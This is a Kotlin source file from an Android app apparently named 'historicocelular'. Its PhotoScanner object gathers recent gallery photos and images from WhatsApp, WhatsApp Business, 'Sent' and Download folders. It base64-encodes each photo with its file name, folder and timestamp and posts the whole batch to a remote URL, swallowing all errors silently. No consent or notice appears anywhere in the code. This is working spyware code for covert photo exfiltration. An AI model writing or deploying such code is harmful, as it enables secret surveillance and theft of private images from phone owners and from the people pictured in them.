package com.example.historicocelular

import android.content.Context
import android.database.Cursor
import android.provider.MediaStore
import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

object PhotoScanner {
    fun enviar(ctx: Context, url: String) {
        try {
            val lista = JSONArray()
            val adicionados = HashSet<String>()

            // 1. Busca pelo MediaStore (fotos em geral, últimas 30)
            try {
                val projecao = arrayOf(
                    MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.DATE_ADDED
                )
                val cursor: Cursor? = ctx.contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projecao, null, null,
                    MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 30"
                )
                cursor?.use {
                    while (it.moveToNext() && lista.length() < 25) {
                        val caminho = it.getString(0) ?: continue
                        if (adicionados.contains(caminho)) continue
                        val arquivo = File(caminho)
                        if (!arquivo.exists()) continue
                        if (arquivo.length() < 5000) continue          // ignora < 5KB
                        if (arquivo.length() > 3_000_000) continue     // ignora > 3MB

                        val bytes = arquivo.readBytes()
                        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        val item = JSONObject().apply {
                            put("nome", arquivo.name)
                            put("pasta", arquivo.parent ?: "")
                            put("ts", it.getLong(1) * 1000)
                            put("imagem", b64)
                        }
                        lista.put(item)
                        adicionados.add(caminho)
                    }
                }
            } catch (e: Exception) {}

            // 2. Busca direto nas pastas do WhatsApp
            val pastasWhats = listOf(
                "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
                "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent",
                "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
                "/storage/emulated/0/WhatsApp/Media/WhatsApp Images/Sent",
                "/storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Images",
                "/storage/emulated/0/Download"
            )

            pastasWhats.forEach { caminho ->
                try {
                    val pasta = File(caminho)
                    if (!pasta.exists() || !pasta.isDirectory) return@forEach
                    val arquivos = pasta.listFiles() ?: return@forEach
                    arquivos
                        .filter { it.isFile && (it.name.endsWith(".jpg", true) || it.name.endsWith(".jpeg", true) || it.name.endsWith(".png", true)) }
                        .sortedByDescending { it.lastModified() }
                        .take(10)
                        .forEach { arq ->
                            if (lista.length() >= 40) return@forEach
                            if (adicionados.contains(arq.absolutePath)) return@forEach
                            if (arq.length() < 5000 || arq.length() > 3_000_000) return@forEach
                            try {
                                val bytes = arq.readBytes()
                                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                                val item = JSONObject().apply {
                                    put("nome", arq.name)
                                    put("pasta", arq.parent ?: "")
                                    put("ts", arq.lastModified())
                                    put("imagem", b64)
                                }
                                lista.put(item)
                                adicionados.add(arq.absolutePath)
                            } catch (e: Exception) {}
                        }
                } catch (e: Exception) {}
            }

            val json = JSONObject().apply { put("fotos", lista) }
            DataSender.postar(url, "fotos", json)
        } catch (e: Exception) {}
    }
}
